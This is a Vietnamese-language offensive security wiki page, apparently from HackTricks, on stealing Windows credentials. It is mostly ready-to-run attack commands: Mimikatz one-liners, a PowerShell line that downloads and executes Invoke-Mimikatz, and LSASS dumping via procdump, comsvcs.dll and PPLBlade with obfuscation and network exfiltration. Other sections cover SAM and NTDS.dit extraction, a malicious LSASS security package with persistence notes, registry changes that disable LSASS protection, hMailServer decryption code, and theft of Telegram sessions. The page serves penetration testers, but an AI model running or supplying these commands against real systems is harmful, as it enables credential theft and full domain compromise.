# Đánh cắp thông tin xác thực Windows

{{#include ../../banners/hacktricks-training.md}}

## Thông tin xác thực Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Tìm hiểu thêm những việc Mimikatz có thể làm tại** [**trang này**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Tìm hiểu về một số biện pháp bảo vệ thông tin xác thực tại đây.**](credentials-protections.md) **Các biện pháp bảo vệ này có thể ngăn Mimikatz trích xuất một số thông tin xác thực.**

## Thông tin xác thực với Meterpreter

Sử dụng [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **mà** tôi đã tạo để **tìm kiếm mật khẩu và hash** trên máy nạn nhân.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Vượt qua AV

### Procdump + Mimikatz

Vì **Procdump của** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**là một công cụ hợp pháp của Microsoft**, nên Defender không phát hiện công cụ này.\
Bạn có thể dùng công cụ này để **dump tiến trình lsass**, **tải dump xuống** và **trích xuất** **thông tin xác thực trên máy cục bộ** từ dump.

Bạn cũng có thể dùng [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Quy trình này được thực hiện tự động bằng [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Lưu ý**: Một số **AV** có thể **phát hiện** việc dùng **procdump.exe để dump lsass.exe** là **độc hại**, vì chúng **phát hiện** chuỗi **"procdump.exe" và "lsass.exe"**. Vì vậy, cách **ẩn mình tốt hơn** là truyền **PID** của lsass.exe làm **đối số** cho procdump **thay vì** tên **lsass.exe**.

### Dump lsass bằng **comsvcs.dll**

Một DLL có tên **comsvcs.dll**, nằm trong `C:\Windows\System32`, chịu trách nhiệm **dump bộ nhớ tiến trình** khi xảy ra sự cố. DLL này có **hàm** tên **`MiniDumpW`**, được thiết kế để gọi bằng `rundll32.exe`.\
Hai đối số đầu tiên không quan trọng, nhưng đối số thứ ba được chia thành ba phần. ID tiến trình cần dump là phần đầu tiên, vị trí lưu tệp dump là phần thứ hai, còn phần thứ ba bắt buộc phải là từ **full**. Không có lựa chọn thay thế nào.\
Sau khi phân tích ba phần này, DLL sẽ tạo tệp dump và ghi bộ nhớ của tiến trình được chỉ định vào tệp đó.\
Có thể dùng **comsvcs.dll** để dump tiến trình lsass, do đó không cần tải lên và thực thi procdump. Phương pháp này được mô tả chi tiết tại [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Lệnh sau được dùng để thực thi:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Bạn có thể tự động hóa quy trình này bằng** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass bằng Task Manager**

1. Nhấp chuột phải vào Thanh tác vụ rồi nhấp vào Task Manager
2. Nhấp vào More details
3. Tìm tiến trình "Local Security Authority Process" trong tab Processes
4. Nhấp chuột phải vào tiến trình "Local Security Authority Process" rồi nhấp vào "Create dump file".

### Dumping lsass bằng procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) là một binary được Microsoft ký, thuộc bộ [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Một crash dump toàn hệ thống đã có sẵn, hoặc bản sao được nén trong thư mục người dùng có thể truy cập, có thể lưu lại dữ liệu thông tin xác thực để phân tích ngoại tuyến. Các tên tệp như `MEMORY.DMP` và `MEMORY.7z` chỉ là manh mối cần kiểm tra: hãy xác minh nguồn gốc và quyền truy cập, đồng thời đừng mặc định rằng chúng chứa thông tin xác thực có thể sử dụng được hoặc còn hiệu lực.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Trích xuất thông tin xác thực ngoại tuyến từ snapshot VM

Bản sao lưu VM có thể đọc được có thể chứa **ảnh bộ nhớ guest** đã lưu, ngay cả khi không truy cập được guest đang chạy hoặc LSASS. Với VMware, hãy xác định metadata snapshot `.vmsn` và tệp `.vmem` đi kèm nếu có; đừng nhầm chúng với ảnh đĩa `.vmdk`. `VMkatz` phân tích đầu vào là snapshot hoặc thư mục VM và có thể khôi phục [thông tin xác thực của phiên đăng nhập Windows](credentials-mimikatz.md), chẳng hạn như hash và ticket, từ bộ nhớ guest. Công cụ này cũng có thể kiểm tra đĩa ảo để tìm dữ liệu SAM/LSA. Điều kiện tiên quyết là có quyền truy cập vào các tệp sao lưu, không phải quyền debug trên VM đang chạy.<sup>[[17]](#references)[[18]](#references)</sup>

```bash
vmkatz snapshot.vmsn
vmkatz --disk disk.vmdk snapshot.vmsn   # Resolve paged-out data when a disk is available
vmkatz /path/to/vm-directory/          # Discover supported VM files
```

Ví dụ trong Checkpoint đã khôi phục được NT hash của tài khoản Administrator **cục bộ** từ snapshot của một VM độc lập. Hash này chỉ xác thực được với domain sau khi xác minh riêng rằng mật khẩu được tái sử dụng; hash cục bộ lấy từ bản sao lưu vốn không phải là thông tin xác thực domain. Trên máy chủ bị giới hạn bộ nhớ, VMkatz có thể quét và giải phóng từng trang bộ nhớ; tuy nhiên, việc sao chép snapshot sang máy phân tích có dung lượng lớn hơn vẫn có thể là lựa chọn phù hợp hơn.<sup>[[17]](#references)[[18]](#references)</sup>

## Dumpin lsass với PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) là một công cụ dump tiến trình được bảo vệ, hỗ trợ làm rối memory dump và chuyển dữ liệu đến các máy trạm từ xa mà không ghi ra đĩa.

**Các chức năng chính**:

1. Vượt qua bảo vệ PPL
2. Làm rối các file memory dump để né cơ chế phát hiện dựa trên signature của Defender
3. Tải memory dump lên bằng phương thức RAW và SMB mà không ghi ra đĩa (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – Dump LSASS dựa trên SSP mà không cần MiniDumpWriteDump

Ink Dragon sử dụng một dumper ba giai đoạn có tên **LalsDumper**, không bao giờ gọi `MiniDumpWriteDump`, vì vậy các hook EDR trên API đó sẽ không kích hoạt:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – tìm trong `fdp.dll` một placeholder gồm 32 ký tự `d` viết thường, thay thế nó bằng đường dẫn tuyệt đối đến `rtu.txt`, lưu DLL đã được chỉnh sửa thành `nfdp.dll`, rồi gọi `AddSecurityPackageA("nfdp","fdp")`. Thao tác này buộc **LSASS** tải DLL độc hại dưới dạng một Security Support Provider (SSP) mới.
2. **Stage 2 bên trong LSASS** – khi LSASS tải `nfdp.dll`, DLL đọc `rtu.txt`, XOR từng byte với `0x20`, rồi ánh xạ blob đã giải mã vào bộ nhớ trước khi chuyển quyền thực thi.
3. **Stage 3 dumper** – payload được ánh xạ sẽ triển khai lại logic MiniDump bằng **direct syscalls** được phân giải từ tên API đã hash (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Một export chuyên biệt có tên `Tom` mở `%TEMP%\<pid>.ddt`, ghi dump LSASS đã nén vào tệp rồi đóng handle để có thể exfiltration sau đó.

Ghi chú cho operator:

* Giữ `lals.exe`, `fdp.dll`, `nfdp.dll` và `rtu.txt` trong cùng một thư mục. Stage 1 ghi đè placeholder được hard-code bằng đường dẫn tuyệt đối đến `rtu.txt`, vì vậy tách chúng ra sẽ làm đứt chuỗi.
* Việc đăng ký được thực hiện bằng cách thêm `nfdp` vào `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Bạn có thể tự thêm giá trị đó để khiến LSASS tải lại SSP mỗi lần khởi động.
* Các tệp `%TEMP%\*.ddt` là dump đã nén. Giải nén cục bộ, sau đó đưa chúng vào Mimikatz/Volatility để trích xuất thông tin xác thực.
* Chạy `lals.exe` cần quyền admin/SeTcb để `AddSecurityPackageA` thành công; khi lệnh trả về, LSASS sẽ tải SSP giả mạo một cách minh bạch và thực thi Stage 2.
* Xóa DLL khỏi đĩa không gỡ nó khỏi LSASS. Hãy xóa mục registry rồi khởi động lại LSASS (khởi động lại máy), hoặc để nguyên nhằm duy trì persistence lâu dài.

## CrackMapExec

### Dump hash SAM

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump NTDS.dit từ DC mục tiêu

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump lịch sử mật khẩu NTDS.dit từ DC mục tiêu

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Hiển thị thuộc tính pwdLastSet cho từng tài khoản trong NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Đánh cắp SAM & SYSTEM

Các tệp này thường được **lưu** tại _C:\windows\system32\config\SAM_ và _C:\windows\system32\config\SYSTEM._ Nhưng **bạn không thể chỉ sao chép chúng theo cách thông thường** vì chúng được bảo vệ.

### Từ Registry

Cách dễ nhất để đánh cắp các tệp này là lấy bản sao từ Registry:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Tải xuống** các tệp đó về máy Kali của bạn và **trích xuất các hash** bằng cách:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Bạn có thể sao chép các tệp được bảo vệ bằng dịch vụ này. Bạn cần có quyền Administrator.

Để xem quy trình khác sử dụng các snapshot đã được hiển thị trên network share có thể đọc được, hãy xem [SMB Previous Versions](../../network-services-pentesting/pentesting-smb/#read-previous-versions-exposed-by-a-share).

#### Sử dụng vssadmin

Tệp nhị phân vssadmin chỉ có trong các phiên bản Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Nhưng bạn cũng có thể làm tương tự từ **Powershell**. Đây là ví dụ về **cách sao chép tệp SAM** (ổ đĩa được dùng là "C:" và tệp được lưu vào C:\users\Public), nhưng bạn có thể dùng cách này để sao chép mọi tệp được bảo vệ:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Mã từ cuốn sách: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Cuối cùng, bạn cũng có thể dùng [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) để tạo bản sao của SAM, SYSTEM và ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Thông tin đăng nhập Active Directory - NTDS.dit**

Tệp **NTDS.dit** được xem là trái tim của **Active Directory**, chứa dữ liệu quan trọng về các đối tượng người dùng, nhóm và thành viên của chúng. Đây là nơi lưu trữ **password hash** của người dùng trong domain. Tệp này là cơ sở dữ liệu **Extensible Storage Engine (ESE)** và nằm tại **_%SystemRoom%/NTDS/ntds.dit_**.

Cơ sở dữ liệu này duy trì ba bảng chính:

- **Data Table**: Bảng này lưu trữ thông tin chi tiết về các đối tượng như người dùng và nhóm.
- **Link Table**: Bảng này theo dõi các mối quan hệ, chẳng hạn như thành viên nhóm.
- **SD Table**: Bảng này lưu **security descriptor** cho từng đối tượng, đảm bảo tính bảo mật và kiểm soát quyền truy cập đối với các đối tượng được lưu trữ.

Nghiên cứu về lớp cơ sở dữ liệu của Christoffer Andersson mô tả chi tiết hơn các bảng này và cách chúng hoạt động tùy theo phiên bản.<sup>[[8]](#references)</sup>

Windows dùng _Ntdsa.dll_ để tương tác với tệp đó và tệp này được _lsass.exe_ sử dụng. Vì vậy, **một phần** của tệp **NTDS.dit** có thể nằm **trong bộ nhớ `lsass`** (có thể dữ liệu được truy cập gần đây nhất nằm ở đó nhờ cải thiện hiệu năng bằng cách sử dụng **cache**).

#### Giải mã hash bên trong NTDS.dit

Hash được mã hóa ba lần:

1. Giải mã Password Encryption Key (**PEK**) bằng **BOOTKEY** và **RC4**.
2. Giải mã **hash** bằng **PEK** và **RC4**.
3. Giải mã **hash** bằng **DES**.

**PEK** có **cùng giá trị trên mọi domain controller**, nhưng được **mã hóa** bên trong **NTDS.dit** bằng **BOOTKEY** riêng của DC lấy từ hive **SYSTEM** của domain controller đó. Do đó, để trích xuất thông tin đăng nhập, cần có cả **NTDS.dit** và **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

Một [kỹ thuật chuyển hướng bảng handle của kernel](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md) riêng biệt có thể sao chép một file object NTDS đã được mở mà không cần VSS, nhưng cần có primitive đọc/ghi kernel tùy ý trên domain controller.<sup>[[16]](#references)</sup>

### Sao chép NTDS.dit bằng Ntdsutil

Có từ Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Bạn cũng có thể dùng thủ thuật [**volume shadow copy**](#stealing-sam-and-system) để sao chép tệp **ntds.dit**. Hãy nhớ rằng bạn cũng cần một bản sao của **tệp SYSTEM** (một lần nữa, hãy dùng thủ thuật [**dump tệp đó từ registry hoặc dùng volume shadow copy**](#stealing-sam-and-system)).

### **Trích xuất hash từ NTDS.dit**

Sau khi **lấy được** các tệp **NTDS.dit** và **SYSTEM**, bạn có thể dùng các công cụ như _secretsdump.py_ để **trích xuất hash**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Bạn cũng có thể **trích xuất chúng tự động** bằng cách sử dụng một tài khoản domain admin hợp lệ:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Đối với các tệp **NTDS.dit lớn**, bạn nên trích xuất bằng [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Cuối cùng, bạn cũng có thể dùng **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ hoặc **mimikatz** `lsadump::lsa /inject`

### **Trích xuất domain objects từ NTDS.dit vào cơ sở dữ liệu SQLite**

Có thể trích xuất các NTDS objects vào cơ sở dữ liệu SQLite bằng [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Công cụ này không chỉ trích xuất secrets mà còn lấy toàn bộ objects và attributes của chúng để tiếp tục trích xuất thông tin, khi đã có được tệp NTDS.dit thô.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Hive `SYSTEM` là tùy chọn nhưng cho phép giải mã secrets (hash NT & LM, thông tin xác thực bổ sung như mật khẩu dạng cleartext, khóa kerberos hoặc trust, lịch sử mật khẩu NT & LM). Ngoài các thông tin khác, dữ liệu được trích xuất gồm: tài khoản người dùng và máy cùng hash, cờ UAC, dấu thời gian đăng nhập lần cuối và thay đổi mật khẩu, mô tả tài khoản, tên, UPN, SPN, nhóm và thành viên đệ quy, cây organizational unit và thành viên, các domain được tin cậy cùng loại, hướng và thuộc tính của trust...

## Lazagne

Tải binary từ [đây](https://github.com/AlessandroZ/LaZagne/releases). Bạn có thể dùng binary này để trích xuất thông tin xác thực từ một số phần mềm.

```
lazagne.exe all
```

## Các công cụ khác để trích xuất thông tin xác thực từ SAM và LSASS

### Windows credentials Editor (WCE)

Có thể dùng công cụ này để trích xuất thông tin xác thực từ bộ nhớ. Tải xuống tại: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Trích xuất thông tin xác thực từ tệp SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Trích xuất thông tin xác thực từ tệp SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Tải xuống từ:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7), rồi chỉ cần **execute** chương trình để trích xuất mật khẩu.

## Khai thác các phiên RDP nhàn rỗi và làm suy yếu các biện pháp kiểm soát bảo mật

FinalDraft RAT của Ink Dragon có tasker `DumpRDPHistory` với các kỹ thuật hữu ích cho mọi red-teamer:<sup>[[3]](#references)</sup>

### Thu thập telemetry theo kiểu DumpRDPHistory

* **Các mục tiêu RDP outbound** – phân tích từng hive người dùng tại `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Mỗi subkey lưu tên máy chủ, `UsernameHint` và dấu thời gian ghi cuối cùng. Bạn có thể tái tạo logic của FinalDraft bằng PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Bằng chứng RDP chiều vào** – truy vấn nhật ký `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` để tìm Event ID **21** (đăng nhập thành công) và **25** (ngắt kết nối), nhằm xác định ai đã quản trị máy này:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Khi biết Domain Admin nào thường xuyên kết nối, hãy dump LSASS (bằng LalsDumper/Mimikatz) trong khi phiên **đã ngắt kết nối** của họ vẫn còn tồn tại. CredSSP + NTLM fallback để lại verifier và token của họ trong LSASS; sau đó có thể replay chúng qua SMB/WinRM để lấy `NTDS.dit` hoặc thiết lập persistence trên domain controller.

### Các thủ thuật hạ cấp Registry mà FinalDraft nhắm đến

Implant này cũng can thiệp vào một số registry key để giúp đánh cắp thông tin xác thực dễ dàng hơn:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` vô hiệu hóa Restricted Admin cho RDP inbound; nó **không** bật pass-the-hash thông qua chế độ đó. Đặt giá trị thành `0` cho phép Restricted Admin trên máy đích, nhưng client phải yêu cầu `/RestrictedAdmin` hoặc sử dụng policy bắt buộc Restricted Admin.<sup>[[14]](#references)</sup> Chỉ riêng hash không cấp quyền quản trị từ xa; xem [các điều kiện tiên quyết để xác thực RDP](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` vô hiệu hóa bộ lọc token UAC để quản trị viên cục bộ nhận được token không bị hạn chế qua mạng.
* `DSRMAdminLogonBehavior=2` cho phép quản trị viên DSRM đăng nhập khi DC đang hoạt động, tạo thêm một tài khoản đặc quyền cao được tích hợp sẵn mà kẻ tấn công có thể sử dụng.
* `RunAsPPL=0` gỡ bỏ các cơ chế bảo vệ LSASS PPL, khiến các công cụ dump như LalsDumper dễ dàng truy cập bộ nhớ.

## Thông tin xác thực cấu hình hMailServer (sau khi xâm nhập)

Kiểm tra chính xác các tệp cấu hình `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` và `C:\ProgramData\hMailServer\hMailServer.ini` tùy theo cách bố trí cài đặt. Giá trị `[Security] AdministratorPassword=` có nội dung và đọc được là hash mật khẩu quản trị hMailServer; đây không phải bằng chứng về mật khẩu Windows Administrator. Nếu khôi phục được thông tin xác thực đó, mọi bước chuyển sang tài khoản Windows đều cần xác minh riêng việc tái sử dụng mật khẩu và quyền đăng nhập.

Với các bản cài đặt sử dụng cơ sở dữ liệu SQL CE, giá trị `[Database] Password=` riêng trong INI dùng để bảo vệ cơ sở dữ liệu. Trong các bản cài đặt cũ, giá trị này được mã hóa bằng Blowfish với khóa tĩnh `THIS_KEY_IS_NOT_SECRET` và thao tác hoán đổi endianness theo từng từ 4 byte. Dùng chuỗi hex trong INI với đoạn Python sau:<sup>[[2]](#references)</sup>

Trước tiên, hãy xác nhận tài khoản hiện tại có thể đọc **cả** INI lẫn cơ sở dữ liệu SQL CE `.sdf` tương ứng. Mật khẩu INI bảo vệ cơ sở dữ liệu; nó tách biệt với các hash tài khoản hộp thư được lưu bên trong. Hãy kiểm tra hoặc nâng cấp **bản sao** của cơ sở dữ liệu đang được sử dụng, tuyệt đối không thao tác trên tệp đang hoạt động.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Với mật khẩu dạng văn bản thuần, sao chép cơ sở dữ liệu SQL CE để tránh khóa tệp, tải provider 32-bit và nâng cấp nếu cần trước khi truy vấn các hash:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Cột `accountpassword` sử dụng định dạng hash của hMailServer (chế độ hashcat `1421`). Mật khẩu mailbox bị crack chỉ giúp chuyển sang tài khoản Windows nếu mật khẩu đó được dùng lại bởi tài khoản cục bộ/miền và tài khoản đó có quyền đăng nhập từ xa cần thiết.

## Chặn callback đăng nhập LSA (LsaApLogonUserEx2)

Một số công cụ thu thập **mật khẩu đăng nhập dạng plaintext** bằng cách chặn callback đăng nhập LSA `LsaApLogonUserEx2`. Ý tưởng là hook hoặc bọc callback của gói xác thực để thu thập thông tin đăng nhập **trong lúc đăng nhập** (trước khi hash), sau đó ghi vào đĩa hoặc trả về cho người vận hành. Cách này thường được triển khai dưới dạng một helper được inject vào LSA hoặc đăng ký với LSA, rồi ghi lại mỗi sự kiện đăng nhập tương tác/mạng thành công cùng với tên người dùng, miền và mật khẩu.<sup>[[1]](#references)</sup>

Lưu ý vận hành:
- Cần quyền admin/SYSTEM cục bộ để nạp helper vào luồng xác thực.
- Thông tin đăng nhập chỉ được thu thập khi có sự kiện đăng nhập (tương tác, RDP, dịch vụ hoặc mạng, tùy thuộc vào hook).

## Thông tin đăng nhập kết nối đã lưu trong SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) lưu thông tin kết nối đã lưu trong tệp `sqlstudio.bin` riêng cho từng người dùng. Các công cụ dump chuyên dụng có thể phân tích tệp này và khôi phục thông tin đăng nhập SQL đã lưu. Trong các shell chỉ trả về đầu ra lệnh, tệp thường được exfiltrate bằng cách mã hóa thành Base64 rồi in ra stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Ở phía operator, dựng lại tệp và chạy dumper cục bộ để khôi phục thông tin xác thực:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Đánh cắp session trình duyệt và cookie qua Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Đánh cắp session `tdata` của Telegram Desktop

Telegram Desktop lưu thông tin xác thực và trạng thái tài khoản trong thư mục **`tdata`**. Có thể nạp một session đã sao chép bằng công cụ tương thích để xác thực mà không cần mật khẩu tài khoản, miễn là quyền xác thực đó vẫn còn hiệu lực; nếu bật mã hóa dữ liệu cục bộ, stealer cũng cần passcode. Sau đó, session đã xác thực có thể làm lộ dữ liệu nhận dạng, metadata về hội thoại và tư cách thành viên, tin nhắn cũng như nội dung đa phương tiện có thể tải xuống.<sup>[[10]](#references)</sup>

### Tìm kiếm và thu thập

Tìm trong cả các bố cục cài đặt và portable; tên package của Microsoft Store có thể khác nhau, vì vậy hãy liệt kê các thư mục package có chứa `TelegramMessenge` và kiểm tra cây thư mục con `LocalCache\Roaming` của chúng.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Nếu thao tác đọc thông thường thất bại và token của tiến trình **đã có và bật** `SeBackupPrivilege`, quyền truy cập nhận biết chế độ backup là phương án dự phòng; nó không cấp quyền này hay nâng quyền cho tiến trình. `CreateFileW` với `FILE_FLAG_BACKUP_SEMANTICS` có thể yêu cầu ngữ nghĩa backup/restore và bỏ qua các kiểm tra bảo mật tệp khi token có các đặc quyền cần thiết, nhưng chỉ riêng cờ này không thể vượt qua khóa chia sẻ không tương thích.<sup>[[10]](#references)[[11]](#references)</sup>

Với các tệp đang bị khóa, hãy tạo/đọc một **Volume Shadow Copy**; với các tệp bị ACL chặn, `robocopy /B` sử dụng chế độ backup và bỏ qua ACL của tệp lẫn thư mục.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

